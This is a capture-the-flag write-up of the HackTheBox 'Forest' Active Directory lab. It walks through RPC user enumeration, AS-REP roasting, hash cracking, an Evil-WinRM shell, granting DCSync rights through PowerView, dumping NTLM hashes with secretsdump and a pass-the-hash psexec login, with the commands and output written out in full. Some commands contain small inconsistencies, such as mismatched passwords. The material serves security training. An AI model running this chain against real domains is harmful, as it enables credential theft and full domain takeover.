---
title: "HackTheBox Forest"
date: 2022-11-11T19:09:00+01:00
draft: false 
---

Exploit a domain controller that allows us to enumerate users over RPC, attack Kerberos 
with AS-REP Roasting, and use Evil-WinRM to get a shell. Then using Bloodhound we can take
advantage of the permissions of some user that allow us to dump admin hash to get a shell as admin.
<!--more-->

# **Introduction**

It's been a long time since I posted my last writeup, now I'm back. We start with a cool box to begin with <span style="color:#85B5EB">Active Directory</span>.

## **Nmap**
Let's start with the nmap scan which shows us typical open ports for a Windows machine :

```text
# Nmap 7.91 scan initiated Tue Jul 13 06:49:02 2021 as: nmap -sC -sV -o output_nmap.txt 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.079s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-13 10:59:12Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## **SMB**

We can see that port 445 is open, which is the SMB port. Let's use with smbmap to see if we can access some shares :

```text
kali@kali# smbmap -H 10.10.10.161
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.161...
[+] IP: 10.10.10.161:445        Name: 10.10.10.161                                      
        Disk    Permissions                                             
        ----     -----------                                               
[!] Access Denied
```
Unfortunately, we can't access the shares without a password but don't worry we can connect as null user with  <span style="color:#85B5EB">rpcclient</span> to enumerate  <span style="color:#85B5EB">users</span> and  <span style="color:#85B5EB">groups</span> : 

```text
kali@kali# rpcclient -U "" -N 10.10.10.161
rpcclient $>
```
Then use enumdomusers command to get a list of users :

```text
rpcclient $> enumdomusers              
user:[Administrator] rid:[0x1f4]       
...[snip]...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]  
user:[andy] rid:[0x47e]                
user:[mark] rid:[0x47f]                
user:[santi] rid:[0x480]
```
Above you can see a list of potential user which might be  <span style="color:#85B5EB">vulnerable</span> to something.

## **Own user svc-alfresco**

 Now what can we do with these users ? We can use a method called  <span style="color:#85B5EB">AS-REP Roasting</span>  to get the password hashes of these users.
This method require the user to have the <span style="color:#85B5EB"> don't require Kerberos pre-authentication</span>  option enabled. We can check this with a script from impacket collection : 
``` 
/opt/tool/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 -usersfile users.txt htb/
```
Jackpot ! We got the hash of the user <span style="color:#85B5EB">svc-alfresco</span>. We can crack his hashes with hashcat :
```
hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt 
```
Hashcat easily cracked the password : <span style="color:#85B5EB">s3rvice</span>.

Finally we can use these credentials to log in as svc-alfresco using <span style="color:#85B5EB">Evil-WinRM</span> :

```
kali@kali# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
                                                         
Info: Starting Evil-WinRM shell v1.7

Info: Establishing connection to remote endpoint
                                                         
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```
From There we can grab the user flag : 
```
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
************************     
```

## **Time for Root**

From there I just collected data using  <span style="color:#85B5EB">bloodhound-python</span>
so we can import the  <span style="color:#85B5EB">.json files</span> in BloodHound :
```
bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns 10.10.10.161 -c DcOnly
```

After importing the data, under  <span style="color:#85B5EB">Queries</span>, just click on   <span style="color:#85B5EB">Find Shorter Paths to Domain Admin</span>, and we get the following graph:
![image text](/bloodhound.png)

Basically svc-alfresco is a member of  <span style="color:#85B5EB">Privileged IT Account</span>, which is a member of  <span style="color:#85B5EB">Account Operators</span>, so it’s like my user is a member of <span style="color:#85B5EB">Account Operators</span> and Account Operators has Generic All privilege on the <span style="color:#85B5EB">Exchange Windows Permissions</span> group. If I click on the edge in Bloodhound, and select help, there’s an <span style="color:#85B5EB">Abuse Info</span> tab in the pop up that displays:

![image text](/abuse_info.png)

The Exchange Windows Permissions group has <span style="color:#85B5EB">WriteDacl</span>
privileges on the Domain. The WriteDACL privilege gives a user the ability to add ACLs to an
object. In other words we can add a user to this group and give them <span style="color:#85B5EB">DCSync privileges<span>.

Let's go back to our shell and create a new user, add him to Exchange Windows Permissions group :

```
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> net user add achla Pa$$sw0rd! /add /domain
```
```
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> net group "Exchange Windows Permissions" achla /add
```

After importing [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script we can
use the Add-ObjectACL with achla's credentials, and give him DCSync rights.

```
$pass = ConvertTo-SecureString 'Pa$$sw0rd!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\achla', $pass)
Add-ObjectAcl -Credential $Cred -PrincipalIdentity achla -Rights DCSync
```

To conclude I used the <span style="color:#85B5EB">secretdump</span> script from impacket to get the NTLM hashes for all domain users.
```
kali@kali# /opt/tool/impacket/examples/secretsdump.py achla:Pa$$w0rd!@10.10.10.161

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...
[*] Cleaning up... 
```

We've got the hash for Administrator, let's just login using psexec (or Evil-WinRM).

```
kali@kali# /opt/tool/impacket/examples/psexec.py Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
Just grab the root flag in Administrator's Desktop and voila.
That all for me, thanks for reading.